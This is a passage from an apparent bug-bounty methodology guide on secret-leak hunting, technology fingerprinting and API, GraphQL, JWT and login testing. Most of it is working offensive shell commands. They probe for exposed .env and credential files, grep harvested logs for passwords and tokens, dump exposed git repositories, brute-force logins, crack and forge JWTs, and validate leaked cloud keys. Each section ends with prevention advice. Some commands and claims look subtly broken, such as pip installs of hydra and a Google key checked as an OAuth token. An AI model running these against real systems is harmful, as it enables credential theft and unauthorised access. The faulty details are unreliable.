7. **Monitoring** – Detect unusual crawling patterns, parameter probing

### References

- [OWASP Testing Guide – Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Business_Logic/)
- [PortSwigger – Web Crawling](https://portswigger.net/web-security/web-crawling)
- [API Security Top 10 – OWASP](https://owasp.org/www-project-api-security/)
- Tools: [katana](https://github.com/projectdiscovery/katana), [gau](https://github.com/lc/gau), [arjun](https://github.com/s0md3v/Arjun)

---

## 5. Sensitive Files & Secret Leakage Hunting

> Comprehensive sensitive file and secret leakage hunting methodology for bug‑bounty reconnaissance, incorporating configuration file discovery, secret scanning, log file analysis, version control exposure, and 2025–2026 trends (cloud credential leaks, CI/CD secrets, AI‑assisted secret detection, automated leak monitoring).

Hunt for exposed configuration files, backups, credentials, API keys, tokens, and sensitive data across web applications, cloud storage, and version control systems.

### Methodology (Secret Leakage Workflow)

**1. Configuration File Discovery**  
- Common config files: `.env`, `config.json`, `settings.py`, `web.config`, `wp‑config.php`  
- Framework‑specific: `firebase.json`, `google‑services.json`, `application.properties`  
- Cloud credentials: `credentials.json`, `azureauth.json`, `aws/credentials`  
- Database configs: `database.yml`, `db.config`, `connection.strings`  

**2. Secret Scanning & Regex Patterns**  
- API keys (AWS, Google, GitHub, Stripe, etc.)  
- Database connection strings (MongoDB, PostgreSQL, Redis)  
- OAuth tokens, JWT secrets, encryption keys  
- Private keys (SSH, RSA, PEM)  
- Tools: `gitleaks`, `trufflehog`, `secret‑finder`, `git‑guardian`  

**3. Log File Analysis**  
- Application logs: `app.log`, `error.log`, `debug.log`  
- Web server logs: `access.log`, `error.log`  
- Framework logs: `laravel.log`, `rails/log/production.log`  
- Search for stack traces, debug information, credentials  

**4. Version Control System Exposure**  
- `.git/` directory exposure (git‑dumper, git‑hound)  
- `.svn/`, `.bzr/`, `CVS/` directories  
- Source code leaks, commit history, hard‑coded secrets  

**5. Backup & Dump Files**  
- Database dumps: `.sql`, `.dump`, `.backup`  
- Code backups: `.zip`, `.tar`, `.rar`, `.bak`  
- Temporary files: `.tmp`, `.swp`, `.swo`  

**6. Advanced Techniques (2025–2026 Trends)**  
- Cloud credential leaks (AWS IAM keys, Azure service principals, GCP service accounts)  
- CI/CD pipeline secrets (GitHub Actions, GitLab CI, Jenkins credentials)  
- AI‑assisted secret detection (ML‑based pattern recognition)  
- Automated leak monitoring with `shhgit`, `gronify`, `watchtower`  

### Tool Installation & Setup

```bash
# Secret scanning tools
go install github.com/zricethezav/gitleaks/v8/cmd/gitleaks@latest
pip3 install trufflehog
go install github.com/eth0izzle/shhgit@latest

# Configuration file discovery
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
pip3 install cariddi

# Git exposure tools
pip3 install git-dumper
go install github.com/tillson/git-hound@latest

# Log analysis
pip3 install loganalyzer
```

### Configuration File Discovery Commands

```bash
# 1. Config & secret file probing
cat alive-domains.txt | sed -E 's#^https?://([^:/]+).*#\1#' | sort -u | while read host; do
    [ -z "$host" ] && continue
    for path in /config.js /config.json /app/config.js /settings.json /database.json /firebase.json /.env /.env.production /.env.local /.env.example /.env.bak /.env.backup /api-keys.json /credentials.json /secret.json /google-services.json /package.json /package-lock.json /composer.json /po.xml /docker-compose.yml /manifest.json /service-worker.js /config.yml /config.yaml /config.xml /config.php /web.config /config.bak /config.example /config/secrets.json /config/keys.json /_wpeprivate/config.json /.git/config; do
        echo "http://${host}${path}"
        echo "https://${host}${path}"
    done
done | httpx -mc 200,301,302,403 -cl -silent -retries 2 -threads 100 \
| awk '$2 != 0 && $2 != 986 { print $1 }' \
| tee results.txt

# 2. Comprehensive sensitive file discovery (50+ patterns)
cat alive-domains.txt | sed 's|http://||;s|https://||;s|:80||;s|:443||' | sort -u | while read host; do
    [ -z "$host" ] && continue
    for path in /.env /.env.production /.env.local /.env.example /.env.bak /.env.backup /.env.test /.env.staging /.env.development /.env.old /.env.save /.env.tmp /config.json /config.php /web.config /api-keys.json /credentials.json /secret.json /secrets.json /database.json /firebase.json /google-services.json /config.yaml /config.yml /appsettings.json /configuration.json /settings.json /wp-config.php /config.inc.php /db.config /database.yml /config/database.yml /backup.sql /dump.sql /backup.zip /dump.tar /backup.rar /dump.rar /.git/config /.svn/entries /CVS/Entries /_wpeprivate/config.json /admin/config.json /api/config.json /app/config.json /src/config.json /includes/config.php /inc/config.php /system/config.php /application/config.php /app/config/database.json /app/config/secrets.json; do
        echo "http://${host}${path}"
        echo "https://${host}${path}"
    done
done | httpx -mc 200,301,302,403 -cl -retries 2 -threads 100 -silent \
| awk '$2 != 0 && $2 != 986 { print $1 }' > leaks.txt

# 3. Targeted sensitive file checks
cat crawledurls.txt | httpx -silent -threads 100 -path /.env,/config.php,/wp-config.php.bak,/.htaccess,/server-status -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew sensitive.txt
```

### Secret Scanning Commands

```bash
# 1. Cariddi – full crawl with secret detection
cariddi -u https://target.com -d 5 -s -e -ext 1 -plain -t 50 -c 20 | tee cariddi-results.txt && grep -E "(api|secret|key|token|pass|auth)" cariddi-results.txt | anew secrets-found.txt

# 2. Gitleaks – scan repositories for secrets
gitleaks detect --source=. --report=gitleaks-report.json

# 3. TruffleHog – entropy‑based secret detection
trufflehog filesystem --directory=/path/to/scan

# 4. Custom regex search for API keys
cat crawledurls.txt | xargs -I@ sh -c 'curl -s @ | grep -Eo "(AKIA[0-9A-Z]{16}|sk_[a-zA-Z0-9]{24}|ghp_[a-zA-Z0-9]{36}|xox[baprs]-[0-9a-zA-Z]{10}-[0-9a-zA-Z]{10}-[0-9a-zA-Z]{10}-[a-zA-Z0-9]{32})" | tee -a api-keys.txt'

# 5. Shhgit – real‑time secret detection
shhgit -local /path/to/scan -silent
```

### Log File Analysis Commands

```bash
# 1. Comprehensive log file discovery
while read host; do
  echo "$host/app.log"
  echo "$host/error.log"
  echo "$host/access.log"
  echo "$host/debug.log"
  echo "$host/laravel.log"
  echo "$host/logs/error.log"
  echo "$host/logs/access.log"
  echo "$host/logs/production.log"
  echo "$host/logs/development.log"
  echo "$host/nginx/error.log"
  echo "$host/nginx/access.log"
  echo "$host/php_errors.log"
  echo "$host/php_error.log"
  echo "$host/wp-content/debug.log"
  echo "$host/backup/error.log"
  echo "$host/tmp/error.log"
  echo "$host/rails/log/production.log"
  echo "$host/rails/log/development.log"
  echo "$host/mail.log"
  echo "$host/auth.log"
  echo "$host/apache/error.log"
  echo "$host/apache/access.log"
  echo "$host/iis/logs/error.log"
  echo "$host/docker/logs/app.log"
  echo "$host/k8s/logs/pod.log"
  echo "$host/error.log.bak"
  echo "$host/logs/error.log.old"
  echo "$host/var/log/apache2/error.log"
done < https-subs.txt | sort -u \
| httpx -mc 200 -cl -fr -rl 100 -threads 50 -silent \
| awk '$2 != 0 && $2 != 986 { print $1 }' \
| xargs -I{} sh -c 'curl -s {} | grep -Ei "password|api_key|apikey|secret|token|ssh|private key|error|exception|database|connection|user|email|credential|failure|unauthorized|warning|info|critical|fatal|aws_access|jwt|bearer|stacktrace|traceback|db_pass|mongo_uri" && echo "==== {} ===="' \
| tee log-leaks.txt

# 2. Search for stack traces in responses
cat crawledurls.txt | httpx -silent -threads 100 -include-response -o response-files.txt
grep -r "Stack trace\|Traceback\|at .*\.java\|at .*\.py\|Caused by:" response_files/ | tee stack-traces.txt
```

### Version Control System Exposure

```bash
# 1. Source code & VCS exposure
cat crawledurls.txt | httpx -silent -threads 100 -path /.svn/entries,/.bzr/README,/CVS/Root -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew vcs-exposed.txt

# 2. Git directory discovery
cat alive-domains.txt | while read host; do curl -s "http://$host/.git/HEAD" | grep -q "ref:" && echo "http://$host/.git/"; done | tee git-exposed.txt

# 3. Git dump with git-dumper
python3 ~/tools/git-dumper/git_dumper.py http://target.com/.git/ ./output_git/

# 4. Git‑Hound for secrets in commit history
git-hound --config-file config.yaml --regex-file regexes.txt --output-file results.txt
```

### Database & Backup Files

```bash
# 1. Database files
cat crawledurls.txt | httpx -silent -threads 100 -path /database.sql,/db.sql,/backup.sql,/dump.sql -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew db-files.txt

# 2. Backup file discovery
cat alive-domains.txt | while read host; do
  for ext in .zip .tar .gz .rar .7z .bak .backup .old .tmp .swp; do
    echo "http://$host/backup$ext"
    echo "https://$host/backup$ext"
  done
done | httpx -mc 200,301,302 -silent -threads 50 | anew backup-files.txt
```

### Advanced Techniques & Automation

```bash
# 1. Automated sensitive file scanner
#!/bin/bash
domain=$1
echo "[+] Scanning for sensitive files on $domain"
cat alive-domains.txt | while read host; do
  for path in /.env /.git/config /config.json /backup.sql; do
    curl -s -o /dev/null -w "%{http_code}" "http://$host$path" | grep -q "^2" && echo "FOUND: http://$host$path"
  done
done | tee sensitive-scan-$domain.txt

# 2. Cloud credential leak detection
aws configure list  # Check for AWS keys
az account show     # Check for Azure credentials
gcloud config list  # Check for GCP credentials

# 3. CI/CD secret scanning (GitHub Actions)
find .github/workflows -name "*.yml" -o -name "*.yaml" | xargs grep -E "(secret|token|key|password)" | tee github-secrets.txt

# 4. AI‑assisted secret detection (using grep with extended patterns)
cat all-files.txt | grep -E -f ~/patterns/secret_patterns.txt | tee potential-secrets.txt
```

### Prevention Guidance (Defensive Perspective)

1. **Secure configuration files** – Never commit `.env`, `config.json` with secrets; use environment variables, secret managers (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault)
2. **Secret scanning in CI/CD** – Integrate `gitleaks`, `trufflehog`, `git‑guardian` into pipelines
3. **Access control** – Restrict access to log files, backup directories, version control metadata
4. **Log management** – Avoid logging sensitive data; use log sanitization, centralized logging
5. **Backup security** – Encrypt backups, store off‑site, restrict access
6. **Git hygiene** – Use `.gitignore`, avoid committing secrets; if leaked, rotate immediately
7. **Cloud credential rotation** – Regularly rotate API keys, IAM credentials, service accounts
8. **Monitoring** – Implement real‑time secret detection, alert on exposed credentials

### References

- [OWASP Testing Guide – Configuration Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/)
- [GitHub Secret Scanning](https://docs.github.com/en/code-security/secret-scanning)
- [AWS Security Best Practices – Credential Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- Tools: [gitleaks](https://github.com/zricethezav/gitleaks), [trufflehog](https://github.com/trufflesecurity/trufflehog), [cariddi](https://github.com/edoardottt/cariddi)

---

## 6. Technology & Exposed Panel Detection

> Comprehensive technology fingerprinting and exposed panel detection methodology for bug‑bounty reconnaissance, incorporating framework identification, debug endpoint discovery, administrative interface detection, and 2025–2026 trends (cloud‑native tech stacks, serverless runtimes, AI‑powered detection, automated panel discovery).

Identify technologies, frameworks, CMS platforms, and exposed administrative interfaces to understand attack surface and prioritize vulnerability testing.

### Methodology (Technology Detection Workflow)

**1. Technology Fingerprinting**  
- HTTP headers: `Server`, `X‑Powered‑By`, `X‑Generator`  
- HTML meta tags, comments, JavaScript libraries  
- File extensions, directory structures, default pages  
- Tools: `wappalyzer`, `whatweb`, `builtwith`, `httpx` tech‑detect  

**2. Framework‑Specific Detection**  
- WordPress, Joomla, Drupal, Magento  
- Laravel, Django, Ruby on Rails, Spring Boot  
- React, Angular, Vue.js, Next.js  
- .NET, Java EE, Node.js, Python Flask  

**3. Debug & Diagnostic Endpoints**  
- Spring Boot Actuators (`/actuator/env`, `/actuator/heapdump`)  
- Django debug mode, Laravel Telescope, Rails console  
- PHP info (`phpinfo.php`), ASP.NET trace  
- Health checks, metrics, profiling endpoints  

**4. Administrative Panels**  
- CMS admin: `/wp‑admin`, `/administrator`, `/admin`  
- Database managers: `phpMyAdmin`, `Adminer`, `pgAdmin`  
- Server management: `cPanel`, `Plesk`, `Webmin`  
- Cloud consoles: AWS Console, Azure Portal, GCP Console  

**5. Version Disclosure & Vulnerability Mapping**  
- Extract version numbers from headers, files, comments  
- Map versions to known CVEs, vulnerabilities  
- Prioritize outdated components with public exploits  

**6. Advanced Techniques (2025–2026 Trends)**  
- Cloud‑native tech stacks (AWS Lambda, Azure Functions, GCP Cloud Run)  
- Serverless runtime detection (cold‑start patterns, unique headers)  
- AI‑powered technology detection (ML‑based fingerprinting)  
- Automated panel discovery with `nuclei`, `feroxbuster`, `dirsearch`  

### Tool Installation & Setup

```bash
# Technology detection
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
sudo apt install -y wget whatweb
npm install -g wappalyzer-cli

# Nuclei templates (includes tech detection)
nuclei -ut

# Directory brute‑forcing for panels
go install github.com/ffuf/ffuf@latest
go install github.com/epi052/feroxbuster@latest
```

### Technology Detection Commands

```bash
# 1. Nuclei technology detection
cat https-subs.txt | httpx | nuclei -t technologies/tech-detect.yaml

# 2. httpx with technology detection
cat https-subs.txt | httpx -tech-detect -title -status-code -web-server -o httpx-tech.txt

# 3. Wappalyzer CLI
cat https-subs.txt | xargs -I@ wappalyzer @ | tee wappalyzer-results.txt

# 4. WhatWeb – detailed fingerprinting
cat alive-domains.txt | while read host; do whatweb -a 3 "http://$host"; done | tee whatweb-results.txt

# 5. BuiltWith API (requires API key)
cat alive-domains.txt | xargs -I@ curl -s "https://api.builtwith.com/v20/api.json?KEY=YOUR_KEY&lookup=@" | jq .
```

### Debug Endpoint Discovery

```bash
# 1. Debug endpoints
cat https-subs.txt | httpx -silent -threads 100 -path /debug,/trace,/actuator,/metrics,/health,/info -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew debug-endpoints.txt

# 2. Spring Boot Actuators
cat https-subs.txt | httpx -silent -threads 100 -path /actuator/env,/actuator/heapdump,/actuator/mappings -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew spring-actuators.txt

# 3. WordPress enumeration
cat https-subs.txt | httpx -silent -threads 100 -path /wp-json/wp/v2/users -mc 200 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew wp-users.txt

# 4. Laravel debug mode
cat https-subs.txt | httpx -silent -threads 100 -match-string "Whoops" -match-string "Laravel" | anew laravel-debug.txt

# 5. Django debug
cat https-subs.txt | httpx -silent -threads 100 -match-string "Django" -match-string "DEBUG" | anew django-debug.txt

# 6. PHP info
cat https-subs.txt | httpx -silent -threads 100 -path /phpinfo.php,/info.php,/test.php -mc 200 -cl | anew phpinfo.txt
```

### Exposed Administrative Panels

```bash
# 1. Nuclei exposed panels
nuclei -l https-subs.txt -t http/exposed-panels/ -c 50 | anew panels.txt

# 2. Common admin paths
cat https-subs.txt | httpx -silent -threads 100 -path /admin,/administrator,/admin.php,/wp-admin,/manager,/phpmyadmin,/adminer,/cpanel,/plesk,/webmin -mc 200,301,302 -cl | awk '$2 != 0 && $2 != 986 { print $1 }' | anew admin-panels.txt

# 3. Database management interfaces
cat https-subs.txt | httpx -silent -threads 100 -path /phpmyadmin,/adminer,/pgadmin,/mysql,/mongodb,/redis-admin -mc 200,401,403 -cl | anew db-panels.txt

# 4. Directory brute‑forcing for hidden panels
ffuf -u https://target.com/FUZZ -w /home/pwn/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o ffuf-panels.txt
```

### Framework‑Specific Detection

```bash
# 1. WordPress detection
cat https-subs.txt | httpx -silent -match-string "wp-content" -match-string "WordPress" | anew wordpress-sites.txt

# 2. Joomla detection
cat https-subs.txt | httpx -silent -match-string "Joomla" -match-string "joomla" | anew joomla-sites.txt

# 3. Drupal detection
cat https-subs.txt | httpx -silent -match-string "Drupal" -match-string "drupal" | anew drupal-sites.txt

# 4. .NET detection
cat https-subs.txt | httpx -silent -match-string "ASP.NET" -match-string "X-AspNet-Version" | anew dotnet-sites.txt

# 5. Java detection
cat https-subs.txt | httpx -silent -match-string "JSESSIONID" -match-string "Java" | anew java-sites.txt
```

### Advanced Techniques & Automation

```bash
# 1. Automated technology detection script
#!/bin/bash
input=$1
echo "[+] Detecting technologies for $input"
cat $input | httpx -tech-detect -title -status-code -web-server -o httpx_tech_$input.txt
cat $input | nuclei -t technologies/ -o nuclei-tech-$input.txt
echo "[+] Technologies detected: $(grep -c "\[tech-detect\]" nuclei-tech-$input.txt)"

# 2. Version extraction and CVE mapping
cat httpx-tech.txt | grep -E "\[.*\]" | while read line; do
  tech=$(echo $line | grep -oE '\[[^]]+\]' | sed 's/\[//;s/\]//')
  version=$(echo $line | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
  echo "$tech $version" >> versions.txt
done
searchsploit -j --exclude="DoS" -t $(cat versions.txt | awk '{print $1}') | jq . > cve-matches.json

# 3. Cloud‑native runtime detection
cat https-subs.txt | httpx -silent -match-string "X-AWS-Lambda" -match-string "X-Google-Cloud-Functions" -match-string "X-Azure-Functions" | anew serverless-sites.txt

# 4. AI‑powered detection (using built‑in ML models)
# Example: custom script using tensorflow‑based classifier
python3 ~/tools/tech-detector/classify.py -i alive-domains.txt -o tech-predictions.json
```

### Prevention Guidance (Defensive Perspective)

1. **Minimize technology disclosure** – Remove unnecessary HTTP headers (`X‑Powered‑By`, `X‑Generator`), obscure HTML comments, meta tags
2. **Secure debug endpoints** – Disable debug mode in production, restrict access to actuator endpoints, use authentication
3. **Admin interface protection** – Strong authentication, IP whitelisting, VPN‑only access, 2FA
4. **Version hiding** – Avoid disclosing exact versions in headers, files, responses
5. **Regular updates** – Keep frameworks, CMS platforms, libraries patched
6. **Cloud security** – Use cloud‑native security controls (AWS WAF, Azure Front Door, GCP Cloud Armor)
7. **Monitoring** – Detect scanning for technology fingerprinting, alert on access to debug endpoints

### References

- [OWASP Testing Guide – Fingerprinting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Fingerprinting_Web_Application_Framework/)
- [PortSwigger – Technology Detection](https://portswigger.net/web-security/technology-detection)
- [BuiltWith](https://builtwith.com/), [Wappalyzer](https://www.wappalyzer.com/) – Technology profiling
- Tools: [httpx](https://github.com/projectdiscovery/httpx), [nuclei](https://github.com/projectdiscovery/nuclei), [whatweb](https://github.com/urbanadventurer/WhatWeb)

---

## 7. API Recon & Security Testing

> Comprehensive API security testing methodology covering REST APIs, GraphQL, authentication mechanisms (JWT, OAuth), API key leakage, and 2025‑2026 trends (BOLA/BOPLA, GraphQL over‑fetching, mass assignment, rate‑limit bypass, cloud‑native API security).

### 7.1 API Testing (REST)

**Methodology Overview** (OWASP API Security Top 10 2023):
1. **Broken Object Level Authorization (BOLA/IDOR)** – Resource ID manipulation
2. **Broken Authentication** – JWT flaws, API key leakage, OAuth misconfigs  
3. **Broken Object Property Level Authorization (BOPLA)** – Mass assignment, over‑posting
4. **Unrestricted Resource Consumption** – Rate‑limit testing, DoS
5. **Broken Function Level Authorization** – Admin endpoint access with user tokens
6. **Unrestricted Access to Sensitive Business Flows** – Business logic flaws
7. **Server‑Side Request Forgery (SSRF)** – See SSRF.md
8. **Security Misconfiguration** – Verbose errors, permissive CORS, exposed debug endpoints
9. **Improper Inventory Management** – Shadow/old APIs, internal endpoints
10. **Unsafe Consumption of APIs** – Trusting third‑party responses

**Tool Installation**:
```bash
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/assetnote/kiterunner/cmd/kr@latest
pip install arjun
```

**Key Detection Commands**:
```bash
# API endpoint discovery
cat https-subs.txt | httpx -silent -threads 100 -path /api/v1,/api/v2,/api/v3,/api/swagger.json,/graphql,/rest,/backend -mc 200,401,403 -cl | tee api-endpoints.txt

# OpenAPI/Swagger detection
ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\napi-docs.json\nswagger-ui.html\nswagger/v1/swagger.json\nv1/swagger.json\nv2/swagger.json\nv3/swagger.json\napi/swagger.json\ndocs/api\napi/docs") -mc 200 -ac -c | tee swagger-found.txt

# Hidden parameter discovery
arjun -u https://target.com/api/endpoint -o params.json
```

**Exploitation Commands**:
```bash
# BOLA/IDOR testing
for id in {100..200}; do curl -s "https://target.com/api/user/$id" -H "Authorization: Bearer $token" | jq '.' | grep -q "email" && echo "Found: $id"; done

# Mass assignment testing
curl -X POST https://target.com/api/user/update -H "Content-Type: application/json" -d '{"name":"test","email":"test@test.com","role":"admin","is_admin":true}'

# Rate‑limit testing
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/api/endpoint" & done | sort | uniq -c
```

**Advanced Techniques (2025‑2026 Trends)**:
- **BOLA/BOPLA chaining** – Combine object‑level and property‑level authorization flaws
- **Rate‑limit bypass** – Header manipulation, parameter pollution, batch requests
- **Shadow API discovery** – Historical endpoints, internal API gateways
- **Cloud‑native API security** – AWS API Gateway, Azure API Management, GCP Cloud Endpoints

**Prevention Guidance**:
- Implement proper authorization checks at both object and property levels
- Use API gateways with rate limiting, WAF, authentication
- Validate all input, use strict schemas, disable verbose errors
- Regular API inventory, deprecate old versions, monitor for shadow APIs

**References**: [OWASP API Security Top 10](https://owasp.org/www-project-api-security/), [PortSwigger API Testing](https://portswigger.net/web-security/api-testing), [Kiterunner](https://github.com/assetnote/kiterunner)

### 7.2 GraphQL Security Testing

**Methodology Overview**:
1. **Endpoint Discovery** – Find GraphQL endpoints (`/graphql`, `/graphiql`, `/playground`)
2. **Introspection Abuse** – Extract full schema; bypass defenses if disabled
3. **DoS / Resource Exhaustion** – Deep nesting, circular fragments, massive batching
4. **Injection** – Unsanitized arguments → SQL/NoSQL/OS command/SSRF
5. **Broken Authorization** – BOLA/IDOR, excessive data exposure
6. **Brute‑force / Replay** – Alias batching for login/OTP brute‑force
7. **CSRF over GraphQL** – If no anti‑CSRF token in mutations

**Tool Installation**:
```bash
npm install -g graphql-path-enum
pip3 install clairvoyance
```

**Key Detection Commands**:
```bash
# GraphQL endpoint discovery
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' 2>/dev/null | grep -i __typename

# Introspection check
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name}}}"}'

# Schema dumping
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d @introspection-query.json -o schema.json
```

**Exploitation Commands**:
```bash
# IDOR / BOLA testing
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{user(id:\"victim-uuid\") {email privateData}}"}'

# DoS via deep nesting
python3 -c "depth=50; query='{user { ' + 'friends { ' * depth + 'id' + ' }' * depth + ' } }'; print(query)" | curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" --data-binary @-

# Alias batching for brute‑force
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{user1:user(id:\"1\"){email} user2:user(id:\"2\"){email} user3:user(id:\"3\"){email}}"}'
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Introspection bypass** – Special characters, alternative content‑types, error‑based guessing
- **GraphQL‑specific DoS** – Circular fragments, directive abuse, query complexity attacks
- **GraphQL injection** – SQLi, NoSQLi, OS command injection via arguments
- **CSRF over GraphQL** – Exploiting missing CSRF tokens in mutations

**Prevention Guidance**:
- Disable introspection in production, implement query depth/complexity limiting
- Use persisted queries, query whitelisting, rate limiting per query
- Validate and sanitize all arguments, implement proper authorization checks
- Add CSRF tokens to mutations, monitor for abnormal query patterns

**References**: [GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html), [Clairvoyance](https://github.com/nikitastupin/clairvoyance), [GraphQL‑Voyager](https://github.com/APIs-guru/graphql-voyager)

### 7.3 JWT (JSON Web Tokens) Security Testing

**Methodology Overview**:
1. **Token Analysis** – Decode JWT, inspect header/claims, identify algorithm
2. **Algorithm Confusion** – `none` algorithm, RS256 ↔ HS256 confusion
3. **Signature Bypass** – Weak secrets, predictable keys, key cracking
4. **Claim Manipulation** – Modify `exp`, `iat`, `nbf`, `sub`, `roles`
5. **Kid Injection** – Path traversal, SQL injection in `kid` header
6. **JWT Tooling** – `jwt_tool`, `jwt‑forge`, `c‑jwt‑cracker`

**Tool Installation**:
```bash
pip3 install jwt-tool
git clone https://github.com/ticarpi/jwt_tool.git
```

**Key Detection Commands**:
```bash
# Decode JWT
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | jq -R 'split(".") | .[0], .[1] | @base64d | fromjson'

# Test for none algorithm
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0." https://target.com/api/protected

# Test for HS256/RS256 confusion
python3 jwt_tool.py -T https://target.com/api/protected
```

**Exploitation Commands**:
```bash
# Crack JWT secret
hashcat -m 16500 jwt.txt /home/pwn/wordlists/wordlist.txt
john --format=jwt jwt.txt --wordlist=/home/pwn/wordlists/wordlist.txt

# Modify claims and re‑sign
python3 jwt_tool.py -S hs256 -k "secret" -c "{\"sub\":\"admin\",\"exp\":9999999999}"

# Kid injection path traversal
python3 jwt_tool.py -S hs256 -k "../../../dev/null" -c "{\"sub\":\"admin\"}" -p
```

**Advanced Techniques (2025‑2026 Trends)**:
- **JWT replay across microservices** – Token reuse in distributed systems
- **Key injection via JWKS** – Manipulate `jku`/`x5u` to attacker‑controlled JWKS
- **Algorithm downgrade** – Force weaker algorithms via header injection
- **Timing attacks** – Signature verification timing differences

**Prevention Guidance**:
- Use strong algorithms (RS256, ES256), avoid `none`, `HS256` with weak secrets
- Validate all claims (`iss`, `aud`, `exp`, `iat`, `nbf`), implement token blacklisting
- Secure key management, rotate keys regularly, use JWKS with proper validation
- Monitor for anomalous tokens, failed validations, replay attempts

**References**: [JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html), [jwt_tool](https://github.com/ticarpi/jwt_tool), [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)

### 7.4 Authentication Testing

**Methodology Overview**:
1. **Login Mechanisms** – Username/password, SSO, OAuth, MFA, password reset
2. **Brute‑Force & Rate Limiting** – Account enumeration, credential stuffing
3. **Session Management** – Session fixation, logout flaws, token leakage
4. **Multi‑Factor Authentication** – Bypass via backup codes, SMS/email interception
5. **Password Reset** – Token leakage, weak generation, predictability
6. **Account Takeover** – Cross‑site leakage, CSRF, subdomain takeover

**Tool Installation**:
```bash
pip3 install hydra
go install github.com/OWASP/Amass/v3/...@latest
```

**Key Detection Commands**:
```bash
# Username enumeration
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=wrong" -w /home/pwn/wordlists/users.txt -mc 200 -fr "Invalid username"

# Password brute‑force
hydra -L /home/pwn/wordlists/users.txt -P /home/pwn/wordlists/passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid password"

# Session fixation test
curl -c cookie.txt https://target.com/login
curl -b cookie.txt https://target.com/dashboard
```

**Exploitation Commands**:
```bash
# MFA bypass via backup codes
curl -X POST https://target.com/mfa/verify -d "code=123456" -H "Cookie: session=leaked"

# Password reset token leakage
curl -s "https://target.com/reset?token=123456" | grep -E "password|change|reset"

# CSRF on password change
curl -X POST https://target.com/change-password -d "newpass=attacker&confirm=attacker" -H "Cookie: session=victim" -H "X-Forwarded-Host: attacker.com"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **AI‑powered credential stuffing** – ML‑based password guessing
- **MFA fatigue attacks** – Spamming push notifications until user accepts
- **Session hijacking via subdomain takeover** – Steal cookies via compromised subdomains
- **OAuth token leakage** – `redirect_uri` open redirect, state parameter CSRF

**Prevention Guidance**:
- Implement strong rate limiting, account lockout, CAPTCHA after failures
- Use secure session management (HTTP‑only, Secure, SameSite flags)
- Enforce MFA, use time‑based codes (TOTP) over SMS/email
- Secure password reset with time‑limited tokens, no user enumeration
- Monitor for anomalous login patterns, credential stuffing attacks

**References**: [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html), [PortSwigger Authentication Labs](https://portswigger.net/web-security/authentication), [Hydra](https://github.com/vanhauser-thc/thc-hydra)

### 7.5 API Key Leakage Hunting

**Methodology Overview**:
1. **Key Formats** – AWS (`AKIA…`), Google (`AIza…`), GitHub (`ghp_…`), Stripe (`sk_…`)
2. **Leak Sources** – GitHub repos, public S3 buckets, JS files, logs, commits
3. **Validation** – Check key validity, permissions, rate limits
4. **Impact Assessment** – Data access, privilege escalation, financial loss
5. **Automated Scanning** – `gitleaks`, `trufflehog`, `shhgit`, `git‑guardian`

**Tool Installation**:
```bash
go install github.com/zricethezav/gitleaks/v8/cmd/gitleaks@latest
pip3 install trufflehog
```

**Key Detection Commands**:
```bash
# Regex search for API keys
grep -rE "(AKIA[0-9A-Z]{16}|sk_[a-zA-Z0-9]{24}|ghp_[a-zA-Z0-9]{36}|xox[baprs]-[0-9a-zA-Z]{10}-[0-9a-zA-Z]{10}-[0-9a-zA-Z]{10}-[a-zA-Z0-9]{32})" .

# Gitleaks scan
gitleaks detect --source=. --report=gitleaks-report.json

# TruffleHog entropy‑based detection
trufflehog filesystem --directory=/path/to/scan
```

**Exploitation Commands**:
```bash
# Validate AWS key
aws configure set aws_access_key_id AKIA... aws_secret_access_key ...
aws sts get-caller-identity

# Validate GitHub token
curl -H "Authorization: token ghp_..." https://api.github.com/user

# Check Google API key
curl "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=AIza..."
```

**Advanced Techniques (2025‑2026 Trends)**:
